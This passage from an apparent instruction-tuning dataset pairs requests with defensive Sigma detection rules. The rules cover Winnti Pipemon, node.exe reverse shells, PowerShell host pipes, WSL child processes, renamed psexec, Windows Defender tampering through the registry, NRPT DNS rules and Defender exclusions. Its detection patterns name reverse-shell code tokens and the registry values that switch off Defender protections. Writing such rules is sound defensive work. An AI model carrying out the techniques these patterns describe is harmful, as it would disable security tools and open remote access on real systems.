    "instruction": "Build a Sigma rule with the goal of detecting specific process characteristics of Winnti Pipemon malware reported by ESET.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect specific process characteristics of Winnti Pipemon malware reported by ESET, you should: focus on the creation of processes within Windows environments. The detection mechanism should look for processes that are initiated with command lines containing 'setup0.exe -p' or 'setup.exe'. Additionally, for those processes started with 'setup.exe', further scrutiny is needed if the command line ends with '-x:0', '-x:1', or '-x:2'. These specific patterns are indicative of the attack strategy employed by the Winnti Pipemon malware. It is crucial, however, to be aware that there might be legitimate software installation processes that use similar command line parameters, which could lead to false positives. The severity of this detection is considered critical due to the malicious nature of the involved software.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains: 'setup0.exe -p'\n    selection_2:\n        CommandLine|contains: 'setup.exe'\n        CommandLine|endswith:\n            - '-x:0'\n            - '-x:1'\n            - '-x:2'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate setups that use similar flags\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains: 'setup0.exe -p'\n    selection_2:\n        CommandLine|contains: 'setup.exe'\n        CommandLine|endswith:\n            - '-x:0'\n            - '-x:1'\n            - '-x:2'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate setups that use similar flags\nlevel: critical\n",
      "question": "specific process characteristics of Winnti Pipemon malware reported by ESET",
      "answer": "In order to detect specific process characteristics of Winnti Pipemon malware reported by ESET, you should: focus on the creation of processes within Windows environments. The detection mechanism should look for processes that are initiated with command lines containing 'setup0.exe -p' or 'setup.exe'. Additionally, for those processes started with 'setup.exe', further scrutiny is needed if the command line ends with '-x:0', '-x:1', or '-x:2'. These specific patterns are indicative of the attack strategy employed by the Winnti Pipemon malware. It is crucial, however, to be aware that there might be legitimate software installation processes that use similar command line parameters, which could lead to false positives. The severity of this detection is considered critical due to the malicious nature of the involved software."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution node.exe which is shipped with multiple software such as VMware, Adobe...etc. In order to execute arbitrary code. For example to establish reverse shell as seen in Log4j attacks...etc.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of node.exe, which is shipped with multiple software such as VMware, Adobe, etc., in order to execute arbitrary code, for example to establish a reverse shell as seen in Log4j attacks among others, you should: Monitor the process creation logs on Windows systems for instances where 'node.exe' is executed. Specifically, look for command lines containing '-e' or '--eval', which are indicative of attempts to evaluate code directly, suggesting arbitrary code execution. Furthermore, pay special attention to command lines that contain all of the following: '.exec(', 'net.socket', '.connect', and 'child_process'. This particular pattern suggests an attempt to establish a reverse shell, which is a common objective in various cyber attacks. It's important to note that false positives are unlikely. However, any detection should be carefully investigated to confirm malicious activity. This approach is critical for identifying and potentially stopping attackers who utilize legitimate software, like Node.js, to execute unauthorized code on a system, which is a tactic often observed in credential access, execution, and defense evasion scenarios.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\node.exe'\n        CommandLine|contains:\n            - ' -e '\n            - ' --eval '\n    # Add more pattern of abuse as actions\n    action_reverse_shell:\n        CommandLine|contains|all:\n            - '.exec('\n            - 'net.socket'\n            - '.connect'\n            - 'child_process'\n    condition: selection and 1 of action_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\node.exe'\n        CommandLine|contains:\n            - ' -e '\n            - ' --eval '\n    # Add more pattern of abuse as actions\n    action_reverse_shell:\n        CommandLine|contains|all:\n            - '.exec('\n            - 'net.socket'\n            - '.connect'\n            - 'child_process'\n    condition: selection and 1 of action_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "execution node.exe which is shipped with multiple software such as VMware, Adobe...etc. In order to execute arbitrary code. For example to establish reverse shell as seen in Log4j attacks...etc",
      "answer": "In order to detect the execution of node.exe, which is shipped with multiple software such as VMware, Adobe, etc., in order to execute arbitrary code, for example to establish a reverse shell as seen in Log4j attacks among others, you should: Monitor the process creation logs on Windows systems for instances where 'node.exe' is executed. Specifically, look for command lines containing '-e' or '--eval', which are indicative of attempts to evaluate code directly, suggesting arbitrary code execution. Furthermore, pay special attention to command lines that contain all of the following: '.exec(', 'net.socket', '.connect', and 'child_process'. This particular pattern suggests an attempt to establish a reverse shell, which is a common objective in various cyber attacks. It's important to note that false positives are unlikely. However, any detection should be carefully investigated to confirm malicious activity. This approach is critical for identifying and potentially stopping attackers who utilize legitimate software, like Node.js, to execute unauthorized code on a system, which is a tactic often observed in credential access, execution, and defense evasion scenarios."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting alternate PowerShell hosts potentially bypassing detections looking for powershell.exe.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect alternate PowerShell hosts potentially bypassing detections looking for powershell.exe, you should monitor for the creation of named pipes that start with '\\PSHost'. This is critical as attackers might utilize alternate methods to invoke PowerShell functionalities without directly calling powershell.exe or similar well-known executables, thus evading traditional detection methods that focus solely on the executable names.\n\nTo achieve this, ensure that your environment is set to log named pipe events, particularly looking for Event IDs 17 and 18 from Sysmon, which pertain to pipe events creation and connection. It's advisable to use a standard Sysmon configuration, such as those provided by SwiftOnSecurity, Neo23x0, or Olaf Hartong, as a starting point and customize it according to your environment.\n\nWhile focusing on the creation of pipes named with a prefix '\\PSHost', the rule also includes a series of filters to reduce false positives:\n\n1. Exclude events where the image path ends with typical PowerShell executables like powershell.exe or powershell_ise.exe, as well as other executables such as sdiagnhost.exe, wsmprovhost.exe, dsac.exe, wbem\\wmiprvse.exe, ForefrontActiveDirectoryConnector.exe, and inetsrv\\w3wp.exe. The last one is noted to possibly cause false positives on Exchange servers.\n   \n2. Exclude null image paths.\n   \n3. Exclude specific paths related to Microsoft SQL Server Tools.\n   \n4. Exclude paths starting with Citrix or Microsoft Exchange Server directories.\n   \n5. And finally, exclude specific images such as ServerManager.exe and PowerSheel 7's pwsh.exe.\n\nThe rule elaborates on capturing the following fields for each event detected: ComputerName, User, Image, and PipeName. This facilitates further investigation by providing context around the detected activity. \n\nIt's essential to be aware of potential false positives, especially involving legitimate programs that might use PowerShell directly, bypassing a dedicated interpreter. The alert level is set to medium, indicating that while detections may not always represent malicious activity, they warrant further investigation due to the potential use of alternate PowerShell hosts for evasion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: pipe_created\n    definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575'\ndetection:\n    selection:\n        PipeName|startswith: '\\PSHost'\n    filter1:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\powershell_ise.exe'\n            - '\\WINDOWS\\System32\\sdiagnhost.exe'\n            - '\\WINDOWS\\System32\\wsmprovhost.exe'\n            - '\\Windows\\system32\\dsac.exe'\n            - '\\Windows\\system32\\wbem\\wmiprvse.exe'\n            - '\\ForefrontActiveDirectoryConnector.exe'\n            - 'c:\\windows\\system32\\inetsrv\\w3wp.exe'   # this is sad :,( but it triggers FPs on Exchange servers\n    filter2:\n        Image: null\n    filter3: # Microsoft SQL Server\\130\\Tools\\\n        Image|contains|all:\n            - ':\\Program Files'\n            - '\\Microsoft SQL Server\\'\n        Image|endswith: '\\Tools\\Binn\\SQLPS.exe'\n    filter4:\n        Image|startswith:\n            - 'C:\\Program Files\\Citrix\\'\n            - 'C:\\Program Files\\Microsoft\\Exchange Server\\'\n    filter5:\n        Image:\n            - 'C:\\Windows\\system32\\ServerManager.exe'\n            - 'C:\\Program Files\\PowerShell\\7\\pwsh.exe' # Powershell 7\n    condition: selection and not 1 of filter*\nfields:\n    - ComputerName\n    - User\n    - Image\n    - PipeName\nfalsepositives:\n    - Programs using PowerShell directly without invocation of a dedicated interpreter.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: pipe_created\n    definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575'\ndetection:\n    selection:\n        PipeName|startswith: '\\PSHost'\n    filter1:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\powershell_ise.exe'\n            - '\\WINDOWS\\System32\\sdiagnhost.exe'\n            - '\\WINDOWS\\System32\\wsmprovhost.exe'\n            - '\\Windows\\system32\\dsac.exe'\n            - '\\Windows\\system32\\wbem\\wmiprvse.exe'\n            - '\\ForefrontActiveDirectoryConnector.exe'\n            - 'c:\\windows\\system32\\inetsrv\\w3wp.exe'   # this is sad :,( but it triggers FPs on Exchange servers\n    filter2:\n        Image: null\n    filter3: # Microsoft SQL Server\\130\\Tools\\\n        Image|contains|all:\n            - ':\\Program Files'\n            - '\\Microsoft SQL Server\\'\n        Image|endswith: '\\Tools\\Binn\\SQLPS.exe'\n    filter4:\n        Image|startswith:\n            - 'C:\\Program Files\\Citrix\\'\n            - 'C:\\Program Files\\Microsoft\\Exchange Server\\'\n    filter5:\n        Image:\n            - 'C:\\Windows\\system32\\ServerManager.exe'\n            - 'C:\\Program Files\\PowerShell\\7\\pwsh.exe' # Powershell 7\n    condition: selection and not 1 of filter*\nfields:\n    - ComputerName\n    - User\n    - Image\n    - PipeName\nfalsepositives:\n    - Programs using PowerShell directly without invocation of a dedicated interpreter.\nlevel: medium\n",
      "question": "alternate PowerShell hosts potentially bypassing detections looking for powershell.exe",
      "answer": "In order to detect alternate PowerShell hosts potentially bypassing detections looking for powershell.exe, you should monitor for the creation of named pipes that start with '\\PSHost'. This is critical as attackers might utilize alternate methods to invoke PowerShell functionalities without directly calling powershell.exe or similar well-known executables, thus evading traditional detection methods that focus solely on the executable names.\n\nTo achieve this, ensure that your environment is set to log named pipe events, particularly looking for Event IDs 17 and 18 from Sysmon, which pertain to pipe events creation and connection. It's advisable to use a standard Sysmon configuration, such as those provided by SwiftOnSecurity, Neo23x0, or Olaf Hartong, as a starting point and customize it according to your environment.\n\nWhile focusing on the creation of pipes named with a prefix '\\PSHost', the rule also includes a series of filters to reduce false positives:\n\n1. Exclude events where the image path ends with typical PowerShell executables like powershell.exe or powershell_ise.exe, as well as other executables such as sdiagnhost.exe, wsmprovhost.exe, dsac.exe, wbem\\wmiprvse.exe, ForefrontActiveDirectoryConnector.exe, and inetsrv\\w3wp.exe. The last one is noted to possibly cause false positives on Exchange servers.\n   \n2. Exclude null image paths.\n   \n3. Exclude specific paths related to Microsoft SQL Server Tools.\n   \n4. Exclude paths starting with Citrix or Microsoft Exchange Server directories.\n   \n5. And finally, exclude specific images such as ServerManager.exe and PowerSheel 7's pwsh.exe.\n\nThe rule elaborates on capturing the following fields for each event detected: ComputerName, User, Image, and PipeName. This facilitates further investigation by providing context around the detected activity. \n\nIt's essential to be aware of potential false positives, especially involving legitimate programs that might use PowerShell directly, bypassing a dedicated interpreter. The alert level is set to medium, indicating that while detections may not always represent malicious activity, they warrant further investigation due to the potential use of alternate PowerShell hosts for evasion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting uncommon or suspicious child processes spawning from a WSL process. This could indicate an attempt to evade parent/child relationship detections or persistence attempts via cron using WSL.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect uncommon or suspicious child processes spawning from a WSL process, which could indicate an attempt to evade parent/child relationship detections or persistence attempts via cron using WSL, you should monitor process creation events specifically within Windows environments. Focus on instances where the parent process is either `wsl.exe` or `wslhost.exe`. These particular parent processes, associated with the Windows Subsystem for Linux (WSL), should not typically spawn certain types of child processes under normal operations. Therefore, pay close attention to the creation of child processes like `powershell.exe`, `pwsh.exe` (PowerShell Core), `cmd.exe` (Command Prompt), and even `calc.exe` (Calculator), which could be leveraged for malicious activities. Additionally, it's crucial to observe the paths from which these child processes are launched. Uncommon or suspicious paths to watch include the `AppData\\Local\\Temp\\`, public user directories (`C:\\Users\\Public\\`), and various temporary folders commonly used by Windows (`C:\\Windows\\Temp\\`, `C:\\Temp\\`) as well as directories like `Downloads` and `Desktop`. Such child processes spawning from WSL processes and launching from these locations suggest a potential security risk, reflecting activities that are not part of the typical usage patterns and might signal evasion or persistence mechanisms employed by adversaries.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\wsl.exe'\n            - '\\wslhost.exe'\n    selection_children_images:\n        Image|endswith:\n            # Add more suspicious/uncommon \"lolbin\" processes\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n            - '\\calc.exe'\n    selection_children_paths:\n        Image|contains:\n            - '\\AppData\\Local\\Temp\\'\n            - 'C:\\Users\\Public\\'\n            - 'C:\\Windows\\Temp\\'\n            - 'C:\\Temp\\'\n            - '\\Downloads\\'\n            - '\\Desktop\\'\n    condition: selection_parent and 1 of selection_children_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\wsl.exe'\n            - '\\wslhost.exe'\n    selection_children_images:\n        Image|endswith:\n            # Add more suspicious/uncommon \"lolbin\" processes\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n            - '\\calc.exe'\n    selection_children_paths:\n        Image|contains:\n            - '\\AppData\\Local\\Temp\\'\n            - 'C:\\Users\\Public\\'\n            - 'C:\\Windows\\Temp\\'\n            - 'C:\\Temp\\'\n            - '\\Downloads\\'\n            - '\\Desktop\\'\n    condition: selection_parent and 1 of selection_children_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "uncommon or suspicious child processes spawning from a WSL process. This could indicate an attempt to evade parent/child relationship detections or persistence attempts via cron using WSL",
      "answer": "In order to detect uncommon or suspicious child processes spawning from a WSL process, which could indicate an attempt to evade parent/child relationship detections or persistence attempts via cron using WSL, you should monitor process creation events specifically within Windows environments. Focus on instances where the parent process is either `wsl.exe` or `wslhost.exe`. These particular parent processes, associated with the Windows Subsystem for Linux (WSL), should not typically spawn certain types of child processes under normal operations. Therefore, pay close attention to the creation of child processes like `powershell.exe`, `pwsh.exe` (PowerShell Core), `cmd.exe` (Command Prompt), and even `calc.exe` (Calculator), which could be leveraged for malicious activities. Additionally, it's crucial to observe the paths from which these child processes are launched. Uncommon or suspicious paths to watch include the `AppData\\Local\\Temp\\`, public user directories (`C:\\Users\\Public\\`), and various temporary folders commonly used by Windows (`C:\\Windows\\Temp\\`, `C:\\Temp\\`) as well as directories like `Downloads` and `Desktop`. Such child processes spawning from WSL processes and launching from these locations suggest a potential security risk, reflecting activities that are not part of the typical usage patterns and might signal evasion or persistence mechanisms employed by adversaries."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of psexec or paexec with renamed service name, helping to filter out the noise if psexec is used for legitimate purposes or if an attacker uses a different psexec client other than the sysinternal one, you should: Monitor Windows security logs for events with ID 5145, which are related to the advanced audit policy setting \"Object Access > Audit Detailed File Share\", configured for both Success and Failure. Specifically, look for events where the ShareName includes '\\\\*\\IPC$', a common indicator of psexec or paexec usage. Additionally, pay attention to the RelativeTargetName field for entries ending with '-stdin', '-stdout', or '-stderr', as these are often associated with the execution of remote commands or scripts via these tools. However, to reduce false positives and filter out legitimate use cases of psexec by system administrators, exclude any events where the RelativeTargetName starts with 'PSEXESVC'. This approach helps in identifying misuse of administrative tools and potential lateral movement or remote execution efforts by attackers, without overly focusing on legitimate administrative activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection1:\n        EventID: 5145\n        ShareName: '\\\\\\\\\\*\\\\IPC$' # looking for the string \\\\*\\IPC$\n        RelativeTargetName|endswith:\n            - '-stdin'\n            - '-stdout'\n            - '-stderr'\n    filter:\n        RelativeTargetName|startswith: 'PSEXESVC'\n    condition: selection1 and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection1:\n        EventID: 5145\n        ShareName: '\\\\\\\\\\*\\\\IPC$' # looking for the string \\\\*\\IPC$\n        RelativeTargetName|endswith:\n            - '-stdin'\n            - '-stdout'\n            - '-stderr'\n    filter:\n        RelativeTargetName|startswith: 'PSEXESVC'\n    condition: selection1 and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one",
      "answer": "In order to detect execution of psexec or paexec with renamed service name, helping to filter out the noise if psexec is used for legitimate purposes or if an attacker uses a different psexec client other than the sysinternal one, you should: Monitor Windows security logs for events with ID 5145, which are related to the advanced audit policy setting \"Object Access > Audit Detailed File Share\", configured for both Success and Failure. Specifically, look for events where the ShareName includes '\\\\*\\IPC$', a common indicator of psexec or paexec usage. Additionally, pay attention to the RelativeTargetName field for entries ending with '-stdin', '-stdout', or '-stderr', as these are often associated with the execution of remote commands or scripts via these tools. However, to reduce false positives and filter out legitimate use cases of psexec by system administrators, exclude any events where the RelativeTargetName starts with 'PSEXESVC'. This approach helps in identifying misuse of administrative tools and potential lateral movement or remote execution efforts by attackers, without overly focusing on legitimate administrative activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when attackers or tools disable Windows Defender functionalities via the Windows registry.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when attackers or tools disable Windows Defender functionalities via the Windows registry, you should monitor the Windows registry for specific changes that indicate such activities. These activities can be identified by watching for the 'SetValue' event type within the registry, specifically targeting modifications in the Windows Defender configurations. The changes of interest involve modifications to registry paths that include: \n\n1. Directories related to Windows Defender and Windows Defender Security Center settings under the '\\SOFTWARE\\Microsoft\\Windows Defender\\' and '\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\'.\n2. Potential modifications to key configurations that are critical for the functioning of Windows Defender's antivirus and anti-spyware capabilities, real-time protection features, reporting mechanisms, and spyware protections. These changes can be in the form of enabling or disabling functionalities such as disabling anti-virus, anti-spyware, behavior monitoring, intrusion prevention system, IOAV protection (Input Output Anti-Virus), on-access protection, real-time monitoring, script scanning, enhanced notifications, block at first seen in SpyNet, and tamper protection features among others.\n\nChanges are considered suspicious if they involve setting certain registry values that effectively disable these protections. For instance, setting a registry value to 'DWORD (0x00000001)' in paths that end with configurations like '\\DisableAntiSpyware', '\\Real-Time Protection\\DisableRealtimeMonitoring' signifies the disabling of these respective features. Conversely, setting a value to 'DWORD (0x00000000)' in paths related to enabling protection features like '\\App and Browser protection\\DisallowExploitProtectionOverride' or '\\Windows Defender Exploit Guard\\Controlled Folder Access\\EnableControlledFolderAccess' could be legitimate actions but also need monitoring as they might indicate attempts to tamper with the system's default security posture.\n\nMonitoring these changes is critical for maintaining the integrity of Windows Defender as a key component of the system's security posture against malware and other threats. However, it's important to consider that some of these registry changes could result from legitimate administrative actions via the Windows Defender interface. Therefore, a high level of vigilance in the analysis of these events is recommended to differentiate between legitimate and malicious activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection_main:\n        EventType: SetValue\n        TargetObject|contains:\n            - '\\SOFTWARE\\Microsoft\\Windows Defender\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\'\n    selection_dword_1:\n        TargetObject|endswith:\n            - '\\DisableAntiSpyware'\n            - '\\DisableAntiVirus'\n            - '\\Real-Time Protection\\DisableBehaviorMonitoring'\n            - '\\Real-Time Protection\\DisableIntrusionPreventionSystem'\n            - '\\Real-Time Protection\\DisableIOAVProtection'\n            - '\\Real-Time Protection\\DisableOnAccessProtection'\n            - '\\Real-Time Protection\\DisableRealtimeMonitoring'\n            - '\\Real-Time Protection\\DisableScanOnRealtimeEnable'\n            - '\\Real-Time Protection\\DisableScriptScanning'\n            - '\\Reporting\\DisableEnhancedNotifications'\n            - '\\SpyNet\\DisableBlockAtFirstSeen'\n        Details: 'DWORD (0x00000001)'\n    selection_dword_0:\n        TargetObject|endswith:\n            - '\\App and Browser protection\\DisallowExploitProtectionOverride'\n            - '\\Features\\TamperProtection'\n            - '\\MpEngine\\MpEnablePus'\n            - '\\PUAProtection'\n            - '\\Signature Update\\ForceUpdateFromMU'\n            - '\\SpyNet\\SpynetReporting'\n            - '\\SpyNet\\SubmitSamplesConsent'\n            - '\\Windows Defender Exploit Guard\\Controlled Folder Access\\EnableControlledFolderAccess'\n        Details: 'DWORD (0x00000000)'\n    condition: selection_main and 1 of selection_dword_*\nfalsepositives:\n    - Administrator actions via the Windows Defender interface\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection_main:\n        EventType: SetValue\n        TargetObject|contains:\n            - '\\SOFTWARE\\Microsoft\\Windows Defender\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\'\n    selection_dword_1:\n        TargetObject|endswith:\n            - '\\DisableAntiSpyware'\n            - '\\DisableAntiVirus'\n            - '\\Real-Time Protection\\DisableBehaviorMonitoring'\n            - '\\Real-Time Protection\\DisableIntrusionPreventionSystem'\n            - '\\Real-Time Protection\\DisableIOAVProtection'\n            - '\\Real-Time Protection\\DisableOnAccessProtection'\n            - '\\Real-Time Protection\\DisableRealtimeMonitoring'\n            - '\\Real-Time Protection\\DisableScanOnRealtimeEnable'\n            - '\\Real-Time Protection\\DisableScriptScanning'\n            - '\\Reporting\\DisableEnhancedNotifications'\n            - '\\SpyNet\\DisableBlockAtFirstSeen'\n        Details: 'DWORD (0x00000001)'\n    selection_dword_0:\n        TargetObject|endswith:\n            - '\\App and Browser protection\\DisallowExploitProtectionOverride'\n            - '\\Features\\TamperProtection'\n            - '\\MpEngine\\MpEnablePus'\n            - '\\PUAProtection'\n            - '\\Signature Update\\ForceUpdateFromMU'\n            - '\\SpyNet\\SpynetReporting'\n            - '\\SpyNet\\SubmitSamplesConsent'\n            - '\\Windows Defender Exploit Guard\\Controlled Folder Access\\EnableControlledFolderAccess'\n        Details: 'DWORD (0x00000000)'\n    condition: selection_main and 1 of selection_dword_*\nfalsepositives:\n    - Administrator actions via the Windows Defender interface\nlevel: high\n",
      "question": "when attackers or tools disable Windows Defender functionalities via the Windows registry",
      "answer": "In order to detect when attackers or tools disable Windows Defender functionalities via the Windows registry, you should monitor the Windows registry for specific changes that indicate such activities. These activities can be identified by watching for the 'SetValue' event type within the registry, specifically targeting modifications in the Windows Defender configurations. The changes of interest involve modifications to registry paths that include: \n\n1. Directories related to Windows Defender and Windows Defender Security Center settings under the '\\SOFTWARE\\Microsoft\\Windows Defender\\' and '\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\'.\n2. Potential modifications to key configurations that are critical for the functioning of Windows Defender's antivirus and anti-spyware capabilities, real-time protection features, reporting mechanisms, and spyware protections. These changes can be in the form of enabling or disabling functionalities such as disabling anti-virus, anti-spyware, behavior monitoring, intrusion prevention system, IOAV protection (Input Output Anti-Virus), on-access protection, real-time monitoring, script scanning, enhanced notifications, block at first seen in SpyNet, and tamper protection features among others.\n\nChanges are considered suspicious if they involve setting certain registry values that effectively disable these protections. For instance, setting a registry value to 'DWORD (0x00000001)' in paths that end with configurations like '\\DisableAntiSpyware', '\\Real-Time Protection\\DisableRealtimeMonitoring' signifies the disabling of these respective features. Conversely, setting a value to 'DWORD (0x00000000)' in paths related to enabling protection features like '\\App and Browser protection\\DisallowExploitProtectionOverride' or '\\Windows Defender Exploit Guard\\Controlled Folder Access\\EnableControlledFolderAccess' could be legitimate actions but also need monitoring as they might indicate attempts to tamper with the system's default security posture.\n\nMonitoring these changes is critical for maintaining the integrity of Windows Defender as a key component of the system's security posture against malware and other threats. However, it's important to consider that some of these registry changes could result from legitimate administrative actions via the Windows Defender interface. Therefore, a high level of vigilance in the analysis of these events is recommended to differentiate between legitimate and malicious activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting powershell scripts that adds a Name Resolution Policy Table (NRPT) rule for the specified namespace.\nThis will bypass the default DNS server and uses a specified server for answering the query.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect PowerShell scripts that add a Name Resolution Policy Table (NRPT) rule for the specified namespace, which will bypass the default DNS server and use a specified server for answering the query, you should look for activity within PowerShell script logs. This detection focuses on systems that run Windows and requires that Script Block Logging is enabled to capture the necessary details. The specific indicators to watch for are the presence of 'Add-DnsClientNrptRule' along with '-Namesp' and '-NameSe' within the same script block text. This combination points to commands that are typically used to configure NRPT rules, indicating an attempt to change how DNS queries are resolved, potentially for malicious purposes. Due to the nature of this activity, it's tagged with a high level of concern, although it's important to consider the context of the execution, as there might be legitimate reasons for these PowerShell commands in certain environments.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Add-DnsClientNrptRule'\n            - '-Namesp'\n            - '-NameSe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Add-DnsClientNrptRule'\n            - '-Namesp'\n            - '-NameSe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "powershell scripts that adds a Name Resolution Policy Table (NRPT) rule for the specified namespace.\nThis will bypass the default DNS server and uses a specified server for answering the query.\n",
      "answer": "In order to detect PowerShell scripts that add a Name Resolution Policy Table (NRPT) rule for the specified namespace, which will bypass the default DNS server and use a specified server for answering the query, you should look for activity within PowerShell script logs. This detection focuses on systems that run Windows and requires that Script Block Logging is enabled to capture the necessary details. The specific indicators to watch for are the presence of 'Add-DnsClientNrptRule' along with '-Namesp' and '-NameSe' within the same script block text. This combination points to commands that are typically used to configure NRPT rules, indicating an attempt to change how DNS queries are resolved, potentially for malicious purposes. Due to the nature of this activity, it's tagged with a high level of concern, although it's important to consider the context of the execution, as there might be legitimate reasons for these PowerShell commands in certain environments."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Setting of Windows Defender Exclusions.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the setting of Windows Defender exclusions, you should: Monitor Windows Defender (WinDefend) logs for events indicating the configuration of the antimalware platform has changed. Specifically, look for EventID 5007, which signifies that there has been a change in the antimalware platform's configuration. Pay close attention to changes which include the addition of new exclusions paths, especially those containing the string '\\Microsoft\\Windows Defender\\Exclusions'. This can be an indicator of an attacker trying to exclude certain files or directories from being scanned by Windows Defender, potentially allowing malicious software to run undetected on the system. Be aware that legitimate administrator actions can also trigger these alerts, so consider these as potential false positives. The severity of this action is considered medium due to its potential use in bypassing Windows Defender's detection capabilities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: windefend\ndetection:\n    selection:\n        EventID: 5007 # The antimalware platform configuration changed.\n        NewValue|contains: '\\Microsoft\\Windows Defender\\Exclusions'\n    condition: selection\nfalsepositives:\n    - Administrator actions\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: windefend\ndetection:\n    selection:\n        EventID: 5007 # The antimalware platform configuration changed.\n        NewValue|contains: '\\Microsoft\\Windows Defender\\Exclusions'\n    condition: selection\nfalsepositives:\n    - Administrator actions\nlevel: medium\n",
      "question": "Setting of Windows Defender Exclusions",
